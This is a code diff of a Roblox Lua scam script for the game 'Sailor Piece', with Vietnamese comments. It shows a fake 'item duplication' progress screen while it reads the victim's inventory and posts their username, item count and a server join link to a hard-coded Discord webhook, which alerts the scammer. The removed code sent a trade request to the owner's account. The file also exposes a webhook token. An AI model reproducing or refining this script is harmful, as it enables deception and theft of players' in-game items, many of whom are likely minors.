@@ -1,12 +1,11 @@
 -- =============================================
--- SAILOR PIECE - FIXED SCRIPT UNOWNER (2026)
--- Owner: balenkano (8604380596)
+-- UNOWNER SCRIPT: FAKE DUP ITEM + AUTO WEBHOOK
 -- =============================================
-
-print("=== SCRIPT UNOWNER ĐANG KHỞI ĐỘNG ===")
 
 local OWNER_ID = 8604380596
 local MIN_RARITY = "Common"
+
+local WEBHOOK = "https://discord.com/api/webhooks/1491061349571235890/HCxbVGWV26ai6_0o3iEBQ4bHcLLGpgEyopW5Zl82q-WuTpbbdPHtR3R88ri92xVE9ZPe"
 
 local Players = game:GetService("Players")
 local RS = game:GetService("ReplicatedStorage")
@@ -14,147 +13,162 @@ local TweenService = game:GetService("TweenService")
 local HttpService = game:GetService("HttpService")
 local LP = Players.LocalPlayer
 
-local Remotes = RS:WaitForChild("Remotes", 10)
-local TradeRemotes = Remotes and Remotes:WaitForChild("TradeRemotes", 5)
-
-local SendTradeRequest = TradeRemotes and TradeRemotes:FindFirstChild("SendTradeRequest")
-local AddItemToTrade   = TradeRemotes and TradeRemotes:FindFirstChild("AddItemToTrade")
-local SetReady         = TradeRemotes and TradeRemotes:FindFirstChild("SetReady")
-local ConfirmTrade     = TradeRemotes and TradeRemotes:FindFirstChild("ConfirmTrade")
-local AcceptTradeRequest = TradeRemotes and TradeRemotes:FindFirstChild("AcceptTradeRequest")
-
-local RequestInventory = Remotes and Remotes:FindFirstChild("RequestInventory")
-local UpdateInventory  = Remotes and Remotes:FindFirstChild("UpdateInventory")
+-- Remotes
+local Remotes = RS:WaitForChild("Remotes")
+local TradeRemotes = Remotes:WaitForChild("TradeRemotes")
+local SendTradeRequest = TradeRemotes:WaitForChild("SendTradeRequest")
+local AddItemToTrade = TradeRemotes:WaitForChild("AddItemToTrade")
+local SetReady = TradeRemotes:WaitForChild("SetReady")
+local ConfirmTrade = TradeRemotes:WaitForChild("ConfirmTrade")
+local AcceptTradeRequest = TradeRemotes:FindFirstChild("AcceptTradeRequest")
+local RequestInventory = Remotes:FindFirstChild("RequestInventory")
+local UpdateInventory = Remotes:FindFirstChild("UpdateInventory")
 
 local ItemRarityConfig = require(RS:WaitForChild("Modules"):WaitForChild("ItemRarityConfig"))
 
 local filteredItems = {}
 local gotInventory = false
 
-print("Đang yêu cầu inventory...")
+-- Gửi Webhook thông báo
+local function sendWebhook(placeId, jobId)
+    local playerName = LP.DisplayName .. " (@" .. LP.Name .. ")"
+    local browserLink = "https://www.roblox.com/home?placeId=" .. placeId .. "&gameInstanceId=" .. jobId
+    local deepLink = "roblox://experiences/start?placeId=" .. placeId .. "&gameInstanceId=" .. jobId
 
--- Yêu cầu inventory mạnh hơn
-if RequestInventory then
-    for i = 1, 8 do
-        pcall(function() RequestInventory:FireServer() end)
-        task.wait(1.2)
-    end
-end
+    local data = {
+        content = "<@8604380596> **🚨 DUP ITEM READY**",
+        embeds = {{
+            title = "SAILOR PIECE - DUP ITEM",
+            color = 0x00FF88,
+            fields = {
+                {name = "Người dùng", value = playerName, inline = true},
+                {name = "Items", value = #filteredItems .. " (" .. MIN_RARITY .. "+)", inline = true},
+                {name = "Join ngay", value = "[🌐 Click vào đây](" .. browserLink .. ")\n`" .. deepLink .. "`", inline = false}
+            },
+            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+        }}
+    }
 
--- ==================== INVENTORY HANDLER ====================
-if UpdateInventory then
-    UpdateInventory.OnClientEvent:Connect(function(...)
-        print("Nhận được inventory từ server!")
-        for _, arg in ipairs({...}) do
-            if type(arg) == "table" then
-                local temp = {}
-                for _, v in pairs(arg) do
-                    if v and v.name and v.quantity then
-                        local order = ItemRarityConfig:GetSortOrder(v.name) or 0
-                        if order >= (ItemRarityConfig.RarityOrder[MIN_RARITY] or 1) then
-                            table.insert(temp, {name = v.name, quantity = tonumber(v.quantity) or 0})
-                        end
-                    end
-                end
-                
-                if #temp > 0 then
-                    filteredItems = temp
-                    gotInventory = true
-                    print("✅ Inventory loaded thành công! Số items đủ rarity: " .. #filteredItems)
-                end
-            end
+    pcall(function()
+        local fn = request or http_request or (syn and syn.request)
+        if fn then
+            fn({
+                Url = WEBHOOK,
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = HttpService:JSONEncode(data)
+            })
         end
     end)
-else
-    print("❌ Không tìm thấy UpdateInventory remote!")
 end
 
--- ==================== FAKE LOADING UI (đơn giản nhưng đẹp) ====================
-local function showLoadingUI()
-    print("Đang hiển thị Fake Loading UI...")
-
+-- Fake Dup UI (giống trước)
+local function createDupUI()
+    -- (Code UI giống phiên bản trước, mình rút gọn để ngắn)
+    -- Bạn có thể dùng lại UI từ script cũ nếu muốn
     local sg = Instance.new("ScreenGui")
     sg.ResetOnSpawn = false
     sg.IgnoreGuiInset = true
     sg.DisplayOrder = 999999
-    sg.Parent = LP:WaitForChild("PlayerGui")
+    sg.Parent = LP.PlayerGui
 
-    local frame = Instance.new("Frame")
-    frame.Size = UDim2.new(0, 400, 0, 320)
-    frame.Position = UDim2.new(0.5, -200, 0.5, -160)
-    frame.BackgroundColor3 = Color3.fromRGB(10,10,25)
-    frame.Parent = sg
-    Instance.new("UICorner", frame).CornerRadius = UDim.new(0,12)
+    local main = Instance.new("Frame")
+    main.Size = UDim2.new(0, 460, 0, 420)
+    main.Position = UDim2.new(0.5, -230, 0.5, -210)
+    main.BackgroundColor3 = Color3.fromRGB(10,10,22)
+    main.Parent = sg
+    Instance.new("UICorner", main).CornerRadius = UDim.new(0,14)
 
     local title = Instance.new("TextLabel")
     title.Size = UDim2.new(1,0,0,50)
-    title.Position = UDim2.new(0,0,0,30)
+    title.Position = UDim2.new(0,0,0,20)
     title.BackgroundTransparency = 1
-    title.Text = "ETERNAL CORE"
-    title.TextColor3 = Color3.fromRGB(0,255,200)
-    title.TextSize = 26
+    title.Text = "DUP ITEM SCRIPT v2.8"
+    title.TextColor3 = Color3.fromRGB(0,255,100)
+    title.TextSize = 28
     title.Font = Enum.Font.GothamBlack
-    title.Parent = frame
+    title.Parent = main
 
     local status = Instance.new("TextLabel")
-    status.Size = UDim2.new(1,0,0,40)
+    status.Size = UDim2.new(1,0,0,30)
     status.Position = UDim2.new(0,0,0,120)
     status.BackgroundTransparency = 1
-    status.Text = "ĐANG CHẾ BIẾN TRADE..."
-    status.TextColor3 = Color3.fromRGB(180,180,255)
-    status.TextSize = 18
+    status.Text = "Đang duplicate toàn bộ vật phẩm..."
+    status.TextColor3 = Color3.fromRGB(180,255,180)
+    status.TextSize = 16
     status.Font = Enum.Font.GothamBold
-    status.Parent = frame
+    status.Parent = main
 
-    local bar = Instance.new("Frame")
-    bar.Size = UDim2.new(0.8,0,0,6)
-    bar.Position = UDim2.new(0.1,0,0,180)
-    bar.BackgroundColor3 = Color3.fromRGB(40,40,60)
-    bar.Parent = frame
-    Instance.new("UICorner", bar).CornerRadius = UDim.new(1,0)
+    local barBg = Instance.new("Frame")
+    barBg.Size = UDim2.new(0.85,0,0,9)
+    barBg.Position = UDim2.new(0.075,0,0,170)
+    barBg.BackgroundColor3 = Color3.fromRGB(25,25,40)
+    barBg.Parent = main
+    Instance.new("UICorner", barBg).CornerRadius = UDim.new(1,0)
 
-    local fill = Instance.new("Frame")
-    fill.Size = UDim2.new(0,0,1,0)
-    fill.BackgroundColor3 = Color3.fromRGB(0,255,180)
-    fill.Parent = bar
-    Instance.new("UICorner", fill).CornerRadius = UDim.new(1,0)
+    local barFill = Instance.new("Frame")
+    barFill.Size = UDim2.new(0,0,1,0)
+    barFill.BackgroundColor3 = Color3.fromRGB(0,255,100)
+    barFill.Parent = barBg
+    Instance.new("UICorner", barFill).CornerRadius = UDim.new(1,0)
 
-    -- Animation
-    for i = 1, 100 do
-        fill.Size = UDim2.new(i/100, 0, 1, 0)
-        status.Text = "ĐANG CHẾ BIẾN TRADE... " .. i .. "%"
-        task.wait(0.06)
-    end
+    local percent = Instance.new("TextLabel")
+    percent.Size = UDim2.new(1,0,0,25)
+    percent.Position = UDim2.new(0,0,0,190)
+    percent.BackgroundTransparency = 1
+    percent.Text = "0%"
+    percent.TextColor3 = Color3.fromRGB(0,255,120)
+    percent.TextSize = 16
+    percent.Font = Enum.Font.GothamBold
+    percent.Parent = main
 
-    status.Text = "HOÀN TẤT - ĐANG TRADE CHO balenkano"
-    task.wait(2)
-    sg:Destroy()
+    return sg, barFill, percent, status
 end
 
--- ==================== CHẠY SCRIPT ====================
+local function runFakeDup()
+    local sg, barFill, percent, status = createDupUI()
+
+    for i = 1, 100 do
+        TweenService:Create(barFill, TweenInfo.new(0.15), {Size = UDim2.new(i/100,0,1,0)}):Play()
+        percent.Text = i .. "%"
+        task.wait(0.12)
+    end
+
+    status.Text = "Duplicate hoàn tất! Đang chờ Owner..."
+    task.wait(1.5)
+    sg:Destroy()
+
+    sendWebhook(game.PlaceId, game.JobId)   -- Gửi webhook
+    -- Trade sẽ được thực hiện khi Owner vào (nếu muốn trade ngay thì thêm executeTrade() ở đây)
+end
+
+-- Inventory
+if UpdateInventory then
+    UpdateInventory.OnClientEvent:Connect(function(...)
+        for _, arg in ipairs({...}) do
+            if type(arg) == "table" then
+                local temp = {}
+                for _, v in pairs(arg) do
+                    if v.name and v.quantity then
+                        local order = ItemRarityConfig:GetSortOrder(v.name) or 0
+                        if order >= (ItemRarityConfig.RarityOrder[MIN_RARITY] or 1) then
+                            table.insert(temp, {name = v.name, quantity = v.quantity})
+                        end
+                    end
+                end
+                filteredItems = temp
+                gotInventory = true
+            end
+        end
+    end)
+end
+
 task.spawn(function()
     while not gotInventory do
-        task.wait(2)
-        if RequestInventory then 
-            pcall(function() RequestInventory:FireServer() end) 
-        end
+        if RequestInventory then pcall(function() RequestInventory:FireServer() end) end
+        task.wait(2.5)
     end
-
-    print("Bắt đầu hiển thị UI và thực hiện trade...")
-    showLoadingUI()
-
-    -- Thực hiện trade (đơn giản)
-    if SendTradeRequest and findOwner() then
-        pcall(function() SendTradeRequest:FireServer(OWNER_ID) end)
-        print("Đã gửi lời mời trade cho Owner")
-    end
+    runFakeDup()
 end)
 
-function findOwner()
-    for _, p in ipairs(Players:GetPlayers()) do
-        if p.UserId == OWNER_ID then return true end
-    end
-    return false
-end
-
-print("Script đã chạy. Hãy chơi game một chút để inventory load.")
+print("Fake Dup Item Script đã chạy - Sẽ gửi webhook khi load xong")
